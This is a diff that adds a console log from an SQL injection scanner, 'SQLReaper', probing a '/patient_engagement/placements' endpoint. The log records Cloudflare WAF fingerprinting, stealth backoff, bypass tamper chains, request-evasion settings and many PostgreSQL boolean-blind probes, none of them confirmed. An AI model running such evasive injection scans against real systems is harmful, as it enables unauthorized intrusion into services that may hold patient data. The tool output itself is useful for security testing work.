@@ -1,0 +1,666 @@
+[+] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 10:42:24 url='/patient_engagement/placem
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[+] [Session] Resuming from saved state: 0 params completed, dbms=PostgreSQL
+[!] StealthEngine: blocking detected, delay  1.2s
+[!] StealthEngine: blocking detected, delay  3.1s
+[!] StealthEngine: blocking detected, delay  7.8s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  11.0s
+[+] ML WAF fingerprint: Cloudflare (conf=0.94)
+[+] ML WAF: Cloudflare
+[+] [v19] WAFMLBypassGenerator activated (WAF=Cloudflare, waf_bypass=5)
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: 5 consecutive max-delay blocks — WAF not responding to delay strategy. Permanently disabling backoff, delay fixed at 0.5s (BUG-V198-STEALTH-SAWTOOTH FIX)
+[+] Safe-mode verification:
+ Ready to scan [oracle=blocked]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   No oracle signal — WAF blocks all probe types; BLOCKED mode
+   Use --playwright to handle JS challenge, or resolve manually
+[+] Safe-mode verification:
+ Ready to scan [oracle=timing_only]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   403/WAF  TIMING_ONLY oracle (sleep delay detected)
+   Use --playwright to handle JS challenge, or resolve manually
+[+] Safe-mode verification:
+ Ready to scan [oracle=full]
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+[+] [OracleMode] Selected: full
+[+] Pre-scan verification OK
+[!] Jitter profile: HIGH_JITTER cv=1.51  timing unreliable, prefer boolean
+[!] Jitter profile recommends SLEEP(4.8s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 4.8s
+[!] Timing unreliable  deprioritising time-based detection
+[+] [v19] Oracle mode confirmed: full
+[*] [diag-cascade] _v14_cascade entered: url='/patient_engagement/placements?countr'
+[+] KB tamper chain: ['space2mssqlblank', 'uppercase', 'versionedkeywords', 'comment_content', 'between']
+[*] [diag-cascade] discovered params: ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire'] markers=[]
+[*] Conformal calibration block complete, proceeding to causal discovery...
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 1 DBMS × 10 categories × 8 params × 3 methods
+[*]  DBMSes   : ['PostgreSQL']
+[*]  Params   : ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire']
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 3000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: POST /patient_engagement/placements (8 params, source=direct)
+[*] A/B detection profiling for 'country'...
+[*] Stability profiling for 'country'...
+[*] [Classify] 'country'  sql_likely (response changes on SQL probes)
+[!] [TimingCal] CDN-cached baseline (P95=0.0ms < 5ms) — baseline probes served from edge cache.  Injection payloads bypass CDN cache and hit backend directly.  Jitter profiler will refine sleep estimate against real backend latency.
+[+] [TimingCal] Baseline: median=0ms P95=0ms IQR=0ms  optimal SLEEP=1.0s
+[Gate]  All 12 optimizations enabled
+[*] [RateCalibrate] Probing rate limits on /patient_engagement/placements?countr...
+[*] [RateCalibrate] User specified --rpm 60, respecting user setting
+[*] [RateCalibrate] Completed
+[*] [RDF] Profiling server response to suspicious headers (6 probes)...
+[+] [RDF] Result: SQL_SPECIFIC
+[+] [RDF] Headers: server reacts specifically to SQL
+[+] Launching expanded surfaces in parallel (WAF: Cloudflare)
+[*] [diag-task] creating primary task: param='country' orig='fr'
+[*] [HDR] Preparing 138 headers for batched scanning ( GET/POST/PUT  all techniques  all DBMS)...
+[*] [COOKIE] Probing for injectable cookies...
+[*] [PUT] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PUT:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'PUT:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'country'...
+[*] [PATCH] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PATCH:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'PATCH:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'country'...
+[*] [diag-surface] scan_surface called: surface='POST:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'POST:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'country'...
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2698, 'BH': 2698, 'IN': 2698, 'BT': 2698, 'T': 2698, 'TH': 2698, 'HQ': 2698, 'E': 2698, 'EH': 2698, 'U': 2698, 'UE': 2698, 'UH': 2698, 'S': 2698, 'ST': 2698, 'NV': 2698, 'WB': 2698, 'EX': 2698, 'HY': 2698, 'SO': 2698}
+    [B] PostgreSQL: 2698 payloads
+    [BH] PostgreSQL: 2698 payloads
+    [IN] PostgreSQL: 2698 payloads
+    [BT] PostgreSQL: 2698 payloads
+    [T] PostgreSQL: 2698 payloads
+    [TH] PostgreSQL: 2698 payloads
+    [HQ] PostgreSQL: 2698 payloads
+    [E] PostgreSQL: 2698 payloads
+    [EH] PostgreSQL: 2698 payloads
+    [U] PostgreSQL: 2698 payloads
+    [UE] PostgreSQL: 2698 payloads
+    [UH] PostgreSQL: 2698 payloads
+    [S] PostgreSQL: 2698 payloads
+    [ST] PostgreSQL: 2698 payloads
+    [NV] PostgreSQL: 2698 payloads
+    [WB] PostgreSQL: 2698 payloads
+    [EX] PostgreSQL: 2698 payloads
+    [HY] PostgreSQL: 2698 payloads
+    [SO] PostgreSQL: 2698 payloads
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2698, 'BH': 2698, 'IN': 2698, 'BT': 2698, 'T': 2698, 'TH': 2698, 'HQ': 2698, 'E': 2698, 'EH': 2698, 'U': 2698, 'UE': 2698, 'UH': 2698, 'S': 2698, 'ST': 2698, 'NV': 2698, 'WB': 2698, 'EX': 2698, 'HY': 2698, 'SO': 2698}
+    [B] PostgreSQL: 2698 payloads
+    [BH] PostgreSQL: 2698 payloads
+    [IN] PostgreSQL: 2698 payloads
+    [BT] PostgreSQL: 2698 payloads
+    [T] PostgreSQL: 2698 payloads
+    [TH] PostgreSQL: 2698 payloads
+    [HQ] PostgreSQL: 2698 payloads
+    [E] PostgreSQL: 2698 payloads
+    [EH] PostgreSQL: 2698 payloads
+    [U] PostgreSQL: 2698 payloads
+    [UE] PostgreSQL: 2698 payloads
+    [UH] PostgreSQL: 2698 payloads
+    [S] PostgreSQL: 2698 payloads
+    [ST] PostgreSQL: 2698 payloads
+    [NV] PostgreSQL: 2698 payloads
+    [WB] PostgreSQL: 2698 payloads
+    [EX] PostgreSQL: 2698 payloads
+    [HY] PostgreSQL: 2698 payloads
+    [SO] PostgreSQL: 2698 payloads
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2698, 'BH': 2698, 'IN': 2698, 'BT': 2698, 'T': 2698, 'TH': 2698, 'HQ': 2698, 'E': 2698, 'EH': 2698, 'U': 2698, 'UE': 2698, 'UH': 2698, 'S': 2698, 'ST': 2698, 'NV': 2698, 'WB': 2698, 'EX': 2698, 'HY': 2698, 'SO': 2698}
+    [B] PostgreSQL: 2698 payloads
+    [BH] PostgreSQL: 2698 payloads
+    [IN] PostgreSQL: 2698 payloads
+    [BT] PostgreSQL: 2698 payloads
+    [T] PostgreSQL: 2698 payloads
+    [TH] PostgreSQL: 2698 payloads
+    [HQ] PostgreSQL: 2698 payloads
+    [E] PostgreSQL: 2698 payloads
+    [EH] PostgreSQL: 2698 payloads
+    [U] PostgreSQL: 2698 payloads
+    [UE] PostgreSQL: 2698 payloads
+    [UH] PostgreSQL: 2698 payloads
+    [S] PostgreSQL: 2698 payloads
+    [ST] PostgreSQL: 2698 payloads
+    [NV] PostgreSQL: 2698 payloads
+    [WB] PostgreSQL: 2698 payloads
+    [EX] PostgreSQL: 2698 payloads
+    [HY] PostgreSQL: 2698 payloads
+    [SO] PostgreSQL: 2698 payloads
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 537 base payloads (2698 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 537 base payloads (2698 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 537 base payloads (2698 expanded)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#1)
+[*] [COOKIE] No Set-Cookie headers in response  skipping cookie injection
+[*] [HDR] Scanning 138 headers in batches of 1...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Forwarded-For:POST' params=['X-Forwarded-For']
+[+] Scanning surface: 'HDR:X-Forwarded-For:POST' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Forwarded-For' already_confirmed=False
+[*] --- testing 'X-Forwarded-For' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Forwarded-For'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Forwarded-For' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'X-Forwarded-For'...
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#2)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#3)
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2698, 'BH': 2698, 'IN': 2698, 'BT': 2698, 'T': 2698, 'TH': 2698, 'HQ': 2698, 'E': 2698, 'EH': 2698, 'U': 2698, 'UE': 2698, 'UH': 2698, 'S': 2698, 'ST': 2698, 'NV': 2698, 'WB': 2698, 'EX': 2698, 'HY': 2698, 'SO': 2698}
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 537 base payloads (2698 expanded)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#4)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#5)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#6)
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#7)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#8)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#9)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#10)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#11)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#12)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#5)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#13)
+[*]    Wasserstein comparison probe (param='country' req#5)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#14)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#15)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#16)
+[*]    Wasserstein comparison probe (param='country' req#5)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#17)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#18)
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#19)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#20)
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#21)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#22)
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#23)
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#24)
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#25)
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0000 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#26)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#5)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#27)
+    [B-bool] [PostgreSQL] 'country' req#13 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#28)
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#13 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#29)
+[*]    Wasserstein comparison probe (param='country' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#30)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#31)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#32)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#33)
+    [B-bool] [PostgreSQL] 'country' req#13 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#34)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#35)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#36)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#37)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#9 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#38)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#39)
+    [B-bool] [PostgreSQL] 'country' req#18 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#19)
+[*]   [Wasserstein] dist=0.6795 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#40)
+[*]    Wasserstein comparison probe (param='country' req#14)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#41)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#11 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#18 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#12)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#42)
+[*]    Wasserstein comparison probe (param='country' req#19)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#43)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#44)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#45)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#46)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#13 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#47)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#48)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#49)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#50)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#51)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#15 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#16)
+[*]   [Wasserstein] dist=0.6841 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#52)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#53)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#54)
+    [B-bool] [PostgreSQL] 'country' req#23 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#55)
+[*]    Wasserstein comparison probe (param='country' req#24)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#56)
+    [B-bool] [PostgreSQL] 'country' req#18 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#19)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#57)
+    [B-bool] [PostgreSQL] 'country' req#23 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#58)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#59)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#60)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#61)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#62)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#63)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#19 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#20)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#64)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#65)
+[*]    Wasserstein comparison probe (param='country' req#24)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#66)
+    [B-bool] [PostgreSQL] 'country' req#28 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#67)
+[*]    Wasserstein comparison probe (param='country' req#29)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#68)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#69)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#70)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#71)
+    [B-bool] [PostgreSQL] 'country' req#30 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#72)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#73)
+[*]    Wasserstein comparison probe (param='country' req#31)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#74)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#24 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#25)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#75)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#76)
+    [B-bool] [PostgreSQL] 'country' req#28 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#29)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#77)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#78)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#79)
+    [B-bool] [PostgreSQL] 'country' req#30 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#31)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#80)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#81)
+    [B-bool] [PostgreSQL] 'country' req#34 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#35)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#82)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#83)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#84)
+    [B-bool] [PostgreSQL] 'country' req#36 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#85)
+[*]    Wasserstein comparison probe (param='country' req#37)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#86)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#29 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#30)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#87)
+    [B-bool] [PostgreSQL] 'country' req#34 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#38 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#39)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#88)
